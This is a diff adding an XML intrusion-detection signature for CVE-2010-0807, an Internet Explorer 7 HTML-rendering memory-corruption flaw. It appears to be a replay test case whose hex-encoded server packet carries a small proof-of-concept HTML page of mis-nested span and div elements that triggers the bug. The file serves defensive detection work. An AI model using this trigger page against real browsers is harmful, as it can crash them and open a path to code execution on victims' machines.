@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft Internet Explorer HTML Rendering Memory Corruption(IPv6 Version)"/>
+    <EngDesc display="true" value="A memory corruption vulnerability exists in Microsoft Internet Explorer. The vulnerability is due to the way that Internet Explorer accesses an object that has been deleted. A remote attacker can exploit this vulnerability by enticing a target user to open a maliciously crafted HTML document. In a sophisticated attack where code injection is successful, the behaviour of the target host is entirely dependent on the intended function of the injected code. The injected code, in this case, would execute within the security context of the currently logged in user. If such an attack is not executed successfully, the vulnerable application may terminate abnormally.(IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Code_Execution/Memory_Corruption"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/HTTPS/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Web_Browser"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Internet_Explorer"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Internet_Explorer_7"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2010-0807"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="33854cd210b2ebb774f373dd3840e2f0"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634058196138251086"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1270200604" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIPv6" type="ImperfectControls.IPv6Address" value="null" index="S"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="T"/>
+    <NamedVar name="sourceIPv6" type="ImperfectControls.IPv6Address" value="null" index="U"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="T"/>
+      <for index="S"/>
+      <for index="U"/>
+    </for>
+    <for index="F">
+      <for index="S"/>
+      <for index="T"/>
+      <for index="U"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:0C:29:7C:3F:68" destMac="00:1B:78:75:79:68" pktType="0800">
+      <IPv6 Version="6" InternetHeaderLength="05" TypeofService="00" TotalLength="0197" Identification="0086" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="9729" srcIP="$sourceIPv6" destIP="$destIPv6" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="1033" destPort="$HTTPdestPort" SeqNumber="A362B3BE" AckNumber="DFEAE353" HeaderLength="05" WindowSize="FAF0" Checksum="7552" UrgentPointer="0000" Options="" Payload="474554202F7E706176656C702F706F632E68746D6C20485454502F312E310D0A4163636570743A20696D6167652F6769662C20696D6167652F782D786269746D61702C20696D6167652F6A7065672C20696D6167652F706A7065672C206170706C69636174696F6E2F766E642E6D732D657863656C2C206170706C69636174696F6E2F766E642E6D732D706F776572706F696E742C206170706C69636174696F6E2F6D73776F72642C202A2F2A0D0A4163636570742D4C616E67756167653A20656E2D75730D0A55412D4350553A207838360D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A557365722D4167656E743A204D6F7A696C6C612F342E302028636F6D70617469626C653B204D53494520372E303B2057696E646F7773204E5420352E323B202E4E455420434C5220312E312E34333232290D0A486F73743A20737469636B790D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="F" Count="">
+      <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:7C:3F:68" pktType="0800">
+        <IPv6 Version="6" InternetHeaderLength="05" TypeofService="00" TotalLength="0326" Identification="FEEC" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="D733" srcIP="$destIPv6" destIP="$sourceIPv6" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="1033" SeqNumber="DFEAE353" AckNumber="A362B52D" HeaderLength="05" WindowSize="1920" Checksum="03BC" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205765642C203331204D617220323031302031363A31373A323620474D540D0A5365727665723A204170616368652F322E322E33202843656E744F5329205048502F352E312E36206D6F645F707974686F6E2F332E322E3820507974686F6E2F322E342E33206D6F645F7065726C2F322E302E32205065726C2F76352E382E380D0A4C6173742D4D6F6469666965643A205765642C203331204D617220323031302031363A30393A353720474D540D0A455461673A2022363530303033652D3138322D34383331616661333464663430220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203338360D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D49534F2D383835392D310D0A0D0A3C21444F43545950452068746D6C205055424C494320222D2F2F5733432F2F445444205848544D4C20312E30205374726963742F2F454E220A2020202022687474703A2F2F7777772E77332E6F72672F54522F7868746D6C312F4454442F7868746D6C312D7374726963742E647464223E0A3C68746D6C3E0A3C7374796C6520747970653D22746578742F637373223E0A7370616E207B706F736974696F6E3A72656C61746976653B20746F703A3570783B7D0A7370616E20646976207B706F736974696F6E3A6162736F6C7574653B2072696768743A313570783B7D0A3C2F7374796C653E0A0A3C7370616E3E436F707972696768742054454C5553205365637572697479204C6162732E3C6469763E3C2F7370616E3E0A3C7370616E3E3C2F6469763E416C6C205269676874732052657365727665642E3C6469763E3C2F7370616E3E0A3C7370616E3E50726F6F66206F6620436F6E63657074204578706C6F69743C6469763E3C2F6469763E3C2F7370616E3E0A3C2F68746D6C3E0A0A0A0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
